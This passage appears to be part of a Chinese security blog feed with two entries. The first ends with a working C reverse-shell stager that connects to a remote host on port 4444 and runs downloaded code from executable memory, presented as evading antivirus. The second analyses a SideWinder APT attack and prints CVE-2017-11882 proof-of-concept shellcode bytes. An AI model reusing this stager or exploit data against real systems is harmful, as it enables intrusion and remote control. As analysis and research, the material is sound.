class="line"><span class="keyword">int</span> iResult = WSAStartup(MAKEWORD(<span class="number">2</span>, <span class="number">2</span>), &amp;wsaData);</div><div class="line"><span class="keyword">if</span> (iResult != NO_ERROR)</div><div class="line">&#123;</div><div class="line"><span class="built_in">printf</span>(<span class="string">"[!]WSAStartup"</span>);</div><div class="line"><span class="keyword">return</span> <span class="number">-1</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line">SOCKET socket = WSASocketA(AF_INET, SOCK_STREAM, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</div><div class="line"><span class="keyword">if</span> (<span class="literal">NULL</span> == socket)</div><div class="line">&#123;</div><div class="line"><span class="built_in">printf</span>(<span class="string">"[!]WSASocketA"</span>);</div><div class="line"><span class="keyword">return</span> <span class="number">-1</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line">SOCKADDR_IN Sockaddr;</div><div class="line">Sockaddr.sin_family = AF_INET;</div><div class="line">Sockaddr.sin_addr.s_addr = inet_addr(<span class="string">"10.10.10.293"</span>);</div><div class="line">Sockaddr.sin_port = htons(<span class="number">4444</span>);</div><div class="line">iResult = connect(socket, (SOCKADDR *)&amp;Sockaddr,<span class="keyword">sizeof</span>(Sockaddr));</div><div class="line"><span class="keyword">if</span> (iResult != NO_ERROR) </div><div class="line">&#123;</div><div class="line"><span class="built_in">printf</span>(<span class="string">"[!]connect"</span>);</div><div class="line"><span class="keyword">return</span> <span class="number">-1</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">//recv stage length</span></div><div class="line">DWORD dwLength = <span class="number">0</span>;</div><div class="line">iResult = recv(socket, (<span class="keyword">char</span>*)&amp;dwLength, <span class="keyword">sizeof</span>(DWORD), <span class="number">0</span>);</div><div class="line"><span class="keyword">if</span> (iResult == SOCKET_ERROR)</div><div class="line">&#123;</div><div class="line"><span class="built_in">printf</span>(<span class="string">"[!]recv:%0x"</span>,GetLastError());</div><div class="line"><span class="keyword">return</span> <span class="number">-1</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">//VirtualAlloc</span></div><div class="line"><span class="keyword">char</span>* lpBinBuffer = <span class="literal">NULL</span>;</div><div class="line">lpBinBuffer = (<span class="keyword">char</span>*)VirtualAlloc(<span class="literal">NULL</span>, dwLength, MEM_COMMIT, PAGE_EXECUTE_READWRITE);</div><div class="line"><span class="keyword">if</span> (<span class="literal">NULL</span> == lpBinBuffer)</div><div class="line">&#123;</div><div class="line"><span class="built_in">printf</span>(<span class="string">"[!]VirtualAlloc:%0x"</span>, GetLastError());</div><div class="line"><span class="keyword">return</span> <span class="number">-1</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line">DWORD dwtotal = <span class="number">0</span>;</div><div class="line"><span class="keyword">do</span></div><div class="line">&#123;</div><div class="line"><span class="comment">//recv stage </span></div><div class="line"><span class="keyword">int</span> iResult = recv(socket, lpBinBuffer+ dwtotal, dwLength - dwtotal, <span class="number">0</span>);</div><div class="line"><span class="keyword">if</span> (iResult == SOCKET_ERROR)</div><div class="line">&#123;</div><div class="line"><span class="built_in">printf</span>(<span class="string">"[!]recv:%0x"</span>, GetLastError());</div><div class="line"><span class="keyword">return</span> <span class="number">-1</span>;</div><div class="line">&#125;</div><div class="line">dwtotal += iResult;</div><div class="line"></div><div class="line">&#125; <span class="keyword">while</span> (dwtotal &lt; dwLength);</div><div class="line"></div><div class="line"><span class="comment">//for (DWORD dwIndex = 0; dwIndex &lt; dwLength; dwIndex++)</span></div><div class="line"><span class="comment">//lpBinBuffer[dwIndex] = lpBinBuffer[dwIndex] ^ 0x123;</span></div><div class="line"></div><div class="line">((<span class="keyword">void</span>(*)())lpBinBuffer)();</div><div class="line"><span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;这并不会触发火绒的警报，并能反弹出一个shell<br>    <img src="http://hacky.wang/blog/20210829/l0CM0RnhJcll.png?imageslim" alt="mark"><br>    <img src="http://hacky.wang/blog/20210829/GLP47aq5u0qE.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;VT的结果如下。<br>    <img src="http://hacky.wang/blog/20210829/eU5VxoqKJB8I.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;通过Wireshark抓包，可以看到经过三次握手之后，首先会接收一个四字节的数据，这是stage的大小，然后开辟内存，接收stage的内容。<br>    <img src="http://hacky.wang/blog/20210829/5n0auwYB7zqj.png?imageslim" alt="mark"><br>    <img src="http://hacky.wang/blog/20210829/OFju6eyJjpFU.png?imageslim" alt="mark"></p><h2 id="0x4-基于流量的检测"><a href="#0x4-基于流量的检测" class="headerlink" title="0x4 基于流量的检测"></a>0x4 基于流量的检测</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在上一部分，我们了解到 Metasploit首先会接收四字节的值，然后根据这个值开辟该大小的空间，然后接收Stage的内容。如此的话，可能有人提出，只需要检测网络中的PE数据就可以实现对Metasploit的检测。其实不然，在实网中，数据是杂乱的，有可能数据中也存在白的PE数据，所以不能单纯的检测PE数据来确定。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;修改源码即可。def handle_connection(conn, opts={})<br><a href="https://github.com/rapid7/metasploit-framework/blob/a1eef6a2c194284fe5e90be602eaa6417db51651/lib/msf/core/payload/stager.rb#L172" target="_blank" rel="external">https://github.com/rapid7/metasploit-framework/blob/a1eef6a2c194284fe5e90be602eaa6417db51651/lib/msf/core/payload/stager.rb#L172</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;0x0-前言&quot;&gt;&lt;a href=&quot;#0x0-前言&quot; class=&quot;headerlink&quot; title=&quot;0x0 前言&quot;&gt;&lt;/a&gt;0x0 前言&lt;/h2&gt;&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;最近在学习Metasploit相关的东西，主要是基于msfvenom免杀相关的学习，由于免杀技术日新月异，更新速度快。所以本文只抛砖引玉。欢迎各位师傅探讨交流学习。&lt;br&gt;
    
    </summary>
    
      <category term="安全" scheme="https://findream.github.io/categories/%E5%AE%89%E5%85%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>SideWinder某次定向攻击事件的一点思考</title>
    <link href="https://findream.github.io/2020/12/12/SideWinder/"/>
    <id>https://findream.github.io/2020/12/12/SideWinder/</id>
    <published>2020-12-12T07:02:11.000Z</published>
    <updated>2021-11-02T13:51:09.909Z</updated>
    
    <content type="html"><![CDATA[<h1 id="背景与前言"><a href="#背景与前言" class="headerlink" title="背景与前言"></a>背景与前言</h1><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;根据360和微步在线公众号披露的情报称，从今年(2020年)11月份起，SideWinder开始策划针对中国的定向攻击。正如360威胁情报中心公众号所说，本次攻击是SideWinder利用邮件等方式传播带有远程模板的恶意文档发动的一次攻击，具体过程如下，首先利用远程模板注入从远程C2服务器上加载含有CVE-2017-11882漏洞的文档，之后执行恶意payload，加载释放在%temp%中的恶意js文件，该js脚本采用内存反射加载的方式执行C#文件，进而部署恶意后门程序。<br><a id="more"></a></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;觉得这次攻击使用的技术较为新奇，顾在闲暇之时复现了一下本次SideWinder定向攻击，在复现过程了，心中产生了如下3个疑惑：</p><ul><li>1.为何是CVE-2017-11882<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;如果借用沙箱等动态的方式，通过检测指定的溢出点的数据，自然可以判断出是触发了CVE-2017-11882漏洞。但是如果采用静态分析的方式呢。</li><li>2.RunHTMLApplication如何加载js脚本<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在触发CVE-2017-11882之后执行的恶意的shellcode，最后会通过调用RunHTMLApplication，但是参数皆为null，如何最后执行了释放到%temp%的js脚本</li><li>js脚本是如何反射加载C#程序</li></ul><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;本文旨在记录自己在分析中所遇到的种种问题。文中所涉及的样本Hash在微步文章中已给出。各位师傅可自行下载。本人才疏学浅，文中如有错误，请各位积极斧正。</p><h1 id="为何是CVE-2017-11882"><a href="#为何是CVE-2017-11882" class="headerlink" title="为何是CVE-2017-11882"></a>为何是CVE-2017-11882</h1><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;根据<a href="https://www.anquanke.com/post/id/87311" title="银雁冰师傅的文章" target="_blank" rel="external">银雁冰师傅的文章</a>，里面详细描述了漏洞产生的原因和构造poc的方法。据文章中所说的漏洞成因<strong>“是EQNEDT32.EXE进程在读入包含MathType的ole数据时，在拷贝公式字体名称时没有对名称长度进行校验，从而造成栈缓冲区溢出，是一个非常经典的栈溢出漏洞.”</strong></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;触发CVE-2017-11882的样本是一个RTF文件，可以采用oletool工具集来查看，但是只能查看其中的对象数据，并不能判断其是触发了那个漏洞。于是，我想到去了解RTF文件格式，继而确定触发漏洞的数据。进而确定是否触发CVE-2017-11882。但是微软的RTF文件格式文档写的较为繁琐，暂时没有从中获取有用的信息。于是我想到可以通过查看rtfobj是如何解析rtf文件的进而学习RTF的文件格式。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;通过查看rtfobj.py发现，解析rtfobj是通过RtfObjParser.parse函数解析RTF文件的。在RtfObjParser.parse中，rtfobj是根据”{“,”}”,”\“来判断RTF的层级，如果遇到”{“,则层级(level)+1，如果遇到”}”,则层级-1，如果层级为0，说明数据解析完成。<br>    <img src="http://hacky.wang/blog/20201212/2XejeegXjQsV.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;熟悉RTF恶意样本的知道，RTF没有宏代码，但是可以通过携带的Ole对象来实现类似于宏代码的操作。而\object字段则表示文件中存在其他格式文件，可以镶嵌图片，链接文件，html等文件。其中\objdata字段则表示存储了对象数据，通常可以Ole对象。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;rtfobj中OleObject.parse是于解析\objdata字段的数据，ole对象的结构如下：<br>    <img src="http://hacky.wang/blog/20201212/Rb12gkEWwYB5.png?imageslim" alt="mark"><br><figure class="highlight basic"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">01050000 </span>   \\OleVersion</div><div class="line"><span class="symbol">02000000 </span>   \\FormatId</div><div class="line"><span class="symbol">08000000 </span>   \\ClassnameSize</div><div class="line"><span class="number">5061636</span>B61676500  \\Classname</div><div class="line"><span class="symbol">00000000 </span>   \\待使用</div><div class="line"><span class="number">00000000</span></div><div class="line"><span class="number">7</span>a3d0500    \\DataSize </div><div class="line"><span class="number">020...</span></div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;并且通过rtfobj代码，发现OLe数据是以小端方式进行存储的,并且除去一些和分析无关的字节，其结构可基本总结为filename,sourcefile,tempfile,以及data字段。由此可见，这一个objdata是一个ole对象，包含一个名为1.a的js文件。这并不是能触发漏洞的objdata。在看一下第二个objdata<br>     <img src="http://hacky.wang/blog/20201212/78jvSC6AjwQy.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;第二个objdata是Equation.3对象，但是公式编辑器由于自身的问题，存在多个漏洞，所以如何判断该对象会触发CVE-200174-11882呢，我们看一下未经变形的poc。<br><figure class="highlight maxima"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">&#123;\object\objdata </div><div class="line"><span class="number">01050000</span></div><div class="line"><span class="number">02000000</span></div><div class="line"><span class="number">0b000000</span></div><div class="line">4571756174696F6E2E3300</div><div class="line"><span class="number">00000000</span></div><div class="line"><span class="number">00000000</span></div><div class="line"><span class="number">81060000</span></div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;根据银雁冰师傅在<a href="https://www.anquanke.com/post/id/87311" title="CVE-2017-11882漏洞分析、利用及动态检测" target="_blank" rel="external">CVE-2017-11882漏洞分析、利用及动态检测</a>中从零开始构造POC所描述的那样，Equation Native结构的构成为<code>Equation Native Stream Data = EQNOLEFILEHDR + MTEFData</code>，而<code>MTEFData = MTEF header + MTEF Byte Stream</code>。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;根据银雁冰所提到的参考文献<a href="http://web.archive.org/web/20010304111449/http:/mathtype.com:80/support/tech/MTEF_storage.htm#OLE%20Objects" target="_blank" rel="external">http://web.archive.org/web/20010304111449/http:/mathtype.com:80/support/tech/MTEF_storage.htm#OLE%20Objects</a>，EQNOLEFILEHDR结构体如下：<br><figure class="highlight elixir"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">struct EQNOLEFILEHDR &#123;</div><div class="line">    WORD    cbHdr;     <span class="regexp">//</span> length of header, sizeof(EQNOLEFILEHDR) = <span class="number">28</span> bytes</div><div class="line">    DWORD   version;   <span class="regexp">//</span> hiword = <span class="number">2</span>, loword = <span class="number">0</span></div><div class="line">    WORD    cf;        <span class="regexp">//</span> clipboard format (<span class="string">"MathType EF"</span>)</div><div class="line">    DWORD   cbObject;  <span class="regexp">//</span> length of MTEF data following this header <span class="keyword">in</span> bytes</div><div class="line">    DWORD   reserved1; <span class="regexp">//</span> <span class="keyword">not</span> used</div><div class="line">    DWORD   reserved2; <span class="regexp">//</span> <span class="keyword">not</span> used</div><div class="line">    DWORD   reserved3; <span class="regexp">//</span> <span class="keyword">not</span> used</div><div class="line">    DWORD   reserved4; <span class="regexp">//</span> <span class="keyword">not</span> used</div><div class="line">&#125;;</div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;根据<a href="http://web.archive.org/web/20010304041035/http:/mathtype.com:80/support/tech/MTEF3.htm#Introduction" target="_blank" rel="external">http://web.archive.org/web/20010304041035/http:/mathtype.com:80/support/tech/MTEF3.htm#Introduction</a>,MTEF header结构体如下：<br><figure class="highlight gradle"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">struct MTEFHEADER&#123;</div><div class="line"><span class="keyword">BYTE</span> version</div><div class="line"><span class="keyword">BYTE</span> platform: <span class="number">0</span> <span class="keyword">for</span> MAC ,<span class="number">1</span> <span class="keyword">for</span> Win</div><div class="line"><span class="keyword">BYTE</span> product: <span class="number">0</span> <span class="keyword">for</span> Math Type,<span class="number">1</span> <span class="keyword">for</span> Equation Editor</div><div class="line"><span class="keyword">BYTE</span> product version:<span class="number">3</span></div><div class="line"><span class="keyword">BYTE</span> product subversion</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;MTEF Byte Stream的结构体大致如下：<br><figure class="highlight applescript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">struct MTEFByteStream&#123;</div><div class="line">BYTE SIZE <span class="built_in">record</span>:大小</div><div class="line">BYTE PILE <span class="keyword">or</span> LINE <span class="built_in">record</span>：Tag</div><div class="line"><span class="built_in">contents</span> <span class="keyword">of</span> PILE <span class="keyword">or</span> LINE：<span class="built_in">contents</span> <span class="keyword">of</span> Tag</div><div class="line">END <span class="built_in">record</span></div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;FONT Record 结构体如下：<br><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">&#123;</div><div class="line"><span class="keyword">tag</span>   <span class="title"></span></div><div class="line"><span class="title">typeface</span> <span class="keyword">number</span></div><div class="line">style</div><div class="line">font name</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;我们使用一份非变形的CVE-2017-11882样本的Equation Native Stream Data数据来查看一下上述结构体的对应情况。<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line"><span class="number">1</span>c00         <span class="comment">//cbHdr</span></div><div class="line"><span class="number">00000200</span>     <span class="comment">//version</span></div><div class="line">a8c3         <span class="comment">//clipboard format</span></div><div class="line"><span class="number">99020000</span>     <span class="comment">// cbObject </span></div><div class="line"><span class="number">00000000</span>     <span class="comment">//reserved1</span></div><div class="line"><span class="number">48905</span>d00     <span class="comment">//reserved2</span></div><div class="line"><span class="number">6</span>c9c5b00     <span class="comment">//reserved3</span></div><div class="line"><span class="number">00000000</span>     <span class="comment">//reserved4</span></div><div class="line"></div><div class="line"><span class="number">03</span>           <span class="comment">//MTEF_version</span></div><div class="line"><span class="number">01</span>           <span class="comment">//MTEF_platform</span></div><div class="line"><span class="number">01</span>           <span class="comment">//MTEF_product</span></div><div class="line"><span class="number">03</span>           <span class="comment">//MTEF_product version</span></div><div class="line"><span class="number">0</span>a           <span class="comment">//MTEF_product subversion</span></div><div class="line"></div><div class="line"><span class="number">0</span>a           <span class="comment">//SIZE</span></div><div class="line"><span class="number">01</span>           <span class="comment">//可有可无</span></div><div class="line"><span class="number">08</span>           <span class="comment">//Font[tag]</span></div><div class="line"><span class="number">5</span>a           <span class="comment">//typeface</span></div><div class="line"><span class="number">5</span>a           <span class="comment">//style</span></div><div class="line">b844eb7112ba7856341231d08b088b098b096683c13cffe190909090909090909090909090909090909090901421400  <span class="comment">//fontname</span></div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;了解完常规的poc，接下来看一下这次SideWinder本次攻击使用的真实样本大概是这样的<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line">objdata</div><div class="line"><span class="number">01050000</span>                 <span class="comment">//OleVersion</span></div><div class="line"><span class="number">02000000</span>                 <span class="comment">//FormatId</span></div><div class="line"><span class="number">0</span>b000000                 <span class="comment">//ClassnameSize</span></div><div class="line"><span class="number">4571756174696</span>F6E2E3300   <span class="comment">//Equation.3</span></div><div class="line"><span class="number">00000000</span></div><div class="line"><span class="number">00000000</span></div><div class="line"><span class="number">81060000</span>                 <span class="comment">//SIZE</span></div><div class="line"></div><div class="line"><span class="number">02</span>   <span class="comment">//Equation Editor 3.x</span></div><div class="line">&#125;</div><div class="line">c3</div><div class="line"><span class="number">37</span></div><div class="line">C7</div><div class="line"><span class="number">05</span></div><div class="line"></div><div class="line">E5   <span class="comment">//size</span></div><div class="line"><span class="number">01</span></div><div class="line"><span class="number">08</span>   <span class="comment">//tag</span></div><div class="line"><span class="number">11</span>   <span class="comment">//typeface</span></div><div class="line">C6   <span class="comment">//style</span></div><div class="line">BA36646F1D81C20659D6E28B0A8B29BFBC6B22A681F70C0C64A68B1755FFD205D41275952D05127595FFE0E5B4264200</div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;EQNETD32.EXE通过OpenStream读取Equation流。<br>    <img src="http://hacky.wang/blog/20201227/jMUrvNOA9lOM.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;显然，样本并不是读取了常见的Equation Native，而是01Ole10Native。因为如果是常见的Equation Native流，Equation流开头应该是0x1C开头，此处是以0x02开头。而且解析器在最终读取Equation流已经将}等符号自动屏蔽。<br>    <img src="http://hacky.wang/blog/20201227/qkMpigFh6uF1.png?imageslim" alt="mark">、</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;如图，tag = 8，说明这是一个Font Tag，然后将其传入sub_43A87A函数。<br>    <img src="http://hacky.wang/blog/20201227/JRpTXfREcx0d.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;最终在0041774e处获取Font的Name。并最终传入sub_4115A7。显然这已经超过了0x24个字节本身的长度。造成CVE-2017-11882漏洞。<br>    <img src="http://hacky.wang/blog/20201227/9JOs1KKA80ki.png?imageslim" alt="mark"><br>    <img src="http://hacky.wang/blog/20201227/ois76Cgwqour.png?imageslim" alt="mark"></p><h1 id="RunHTMLApplication如何加载js脚本"><a href="#RunHTMLApplication如何加载js脚本" class="headerlink" title="RunHTMLApplication如何加载js脚本"></a>RunHTMLApplication如何加载js脚本</h1><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;恶意的shellcode最终会调用RunHTMLApplication执行js脚本，但是所传入的参数皆为null，所以RunHTMLApplication是如何加载js脚本的？如下是RunHTMLApplication的函数原型。可见第三个参数为调用的命令行参数。但是此参数为null，RunHTMLApplication是如何解析的呢？<br><figure class="highlight hsp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">HRESULT RunHTMLApplication(    </div><div class="line">   <span class="keyword">HINSTANCE</span> hinst,</div><div class="line">   <span class="keyword">HINSTANCE</span> hPrevInst,</div><div class="line">   LPSTR szCmdLine,</div><div class="line">   <span class="keyword">int</span> nCmdShow</div><div class="line">)<span class="comment">;</span></div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;通过分析mshtml.dll中的导出函数RunHTMLApplication可知，首先会调用GetCmdLine(void)函数，主要是通过GetCommandLineW()函数获取命令行参数，然后通过CreateHTAMoniker函数解析所得到的命令行数据，获取命令行中:之前的内容，然后根据注册表HKCR\SOFTWARE\Classes\PROTOCOLS\Handler\内容调用相关协议处理器解析处理。<br>    <img src="http://hacky.wang/blog/20201212/8xrpickAH8Q7.png?imageslim" alt="mark"><br>    <img src="http://hacky.wang/blog/20201212/UcsNSGku38k7.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;但是命令行参数是何时被修改的呢，在shellcode中，首先会利用GetCommandLine获取命令行参数，然后通过异或加密的方式加密该参数。最后通过RunHTMLApplication函数中的命令行解释器就可以获取到被修改的命令行参数。<br>    <img src="http://hacky.wang/blog/20201212/8ynnkp6jyCHq.png?imageslim" alt="mark"><br>    <img src="http://hacky.wang/blog/20201212/G8rfXJaQ7Axh.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;命令行参数很简单，是几行js代码，主要是读取位于%temp%1.a的js脚本内容，并执行之。<br>    <img src="http://hacky.wang/blog/20201212/ajiGBWK5ImI0.png?imageslim" alt="mark"></p><h1 id="js如何反射加载C-程序"><a href="#js如何反射加载C-程序" class="headerlink" title="js如何反射加载C#程序"></a>js如何反射加载C#程序</h1><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;光看代码，yMVonTE和dgDDmZRs很显然是用来加密后续需要使用到的一些属性。部分代码的加密逻辑是这样的，首先采用利用变形过的Base64去编码传入的原始字符串，然后再用生成出来的变形的Base64字符串进行两轮循环的加密，由此产生后续可以执行的代码流。<br>    <img src="http://hacky.wang/blog/20201222/KL0nj9sYRKbX.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;可以直接使用浏览器调试去进一步还原被加密之后的js代码，这里可以参考<a href="https://blog.csdn.net/magi1201/article/details/43927915" target="_blank" rel="external">这篇文章</a>，通过上述代码边解密，边执行的特性，很容易还原整个原始代码，整个流程主要分为两个部分，首先通过xnEVdV()函数去获取csc.exe文件的版本号，分别是V2的版本和V4的版本。<br>    <img src="http://hacky.wang/blog/20201222/YwX2VyR4qqyL.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;第二歩需要将被Base64编码过的Paload写入内存中。很显然，下一步需要执行的PE文件就在其中。<br>    <img src="http://hacky.wang/blog/20201222/3nG13kNEKFxJ.png?imageslim" alt="mark"><br>    <img src="http://hacky.wang/blog/20201222/Alny7wACvqPD.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在公众号中已经介绍了使用到的技术是DotNetToJScript，在其github上下载到了DotNetToJScript项目，并利用VS2015进行编译，利用官网所提供的参数编译得到一份Test.js,通过对比Testjs和去混淆之后的js脚本，发现流程基本一致。都是利用CreateInstance创建一个实例，然后调用方法的方式进行反射注入的。<br>    <img src="http://hacky.wang/blog/20201222/BlNfWXuzUR6d.png?imageslim" alt="mark"></p><h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;本次攻击还是采用SideWinder过去经常使用的攻击技巧，变化不大，但适合没有接触的师傅共同学习，探讨。</p><ol><li><a href="https://www.anquanke.com/post/id/87311" title="CVE-2017-11882漏洞分析、利用及动态检测" target="_blank" rel="external">CVE-2017-11882漏洞分析、利用及动态检测</a></li><li><a href="响尾蛇组织近期针对我国特定机构的APT攻击活动披露" title="https://mp.weixin.qq.com/s?__biz=MzUyMjk4NzExMA==&amp;mid=2247485130&amp;idx=1&amp;sn=66370e46076a1f6da38fe3d690948550&amp;chksm=f9c235c3ceb5bcd543190ca1d4db4654f4131db1f1efd38dfe1197a270704ea4dc998c5d689e&amp;mpshare=1&amp;scene=1&amp;srcid=1119NcpmfwcPjYaDTTXuHiEH&amp;sharer_sharetime=1606020755577&amp;sharer_shareid=4c4694001f449570936fa531f032aaa9&amp;key=cac79074cb1ad8d8d6ee1057f5e579c1d515941b41aaf910ff8d3fa3c22658f05f379ae9459c5608ec49bb0617c1e4bee8b2bd5743c2568345a35c90a41e070cafad74ff64eb9f5bf445d0364dd70a0c60e788a39fbede239a98c340ea7656d157cebe65f23af06a3605aad5e0629c095f0164fe123386f13185944e46ede27d&amp;ascene=1&amp;uin=Mjc5NjE0NTA0MA%3D%3D&amp;devicetype=Windows+7+x64&amp;version=6300002f&amp;lang=zh_CN&amp;exportkey=A0eOXsbA3QVKpIHtl%2FDecyI%3D&amp;pass_ticket=EREBvV87%2FHVI7ra1M9PIxhT4yvmc7xpEULsE4FHBfVWU6Nxb2%2BZ8qyVeu6RqTFOi&amp;wx_header=0">响尾蛇组织近期针对我国特定机构的APT攻击活动披露</a></li><li><a href="利用JS加载.Net程序" title="https://3gstudent.github.io/3gstudent.github.io/%E5%88%A9%E7%94%A8JS%E5%8A%A0%E8%BD%BD.Net%E7%A8%8B%E5%BA%8F/">利用JS加载.Net程序</a></li></ol>]]></content>
    
    <summary type="html">
    
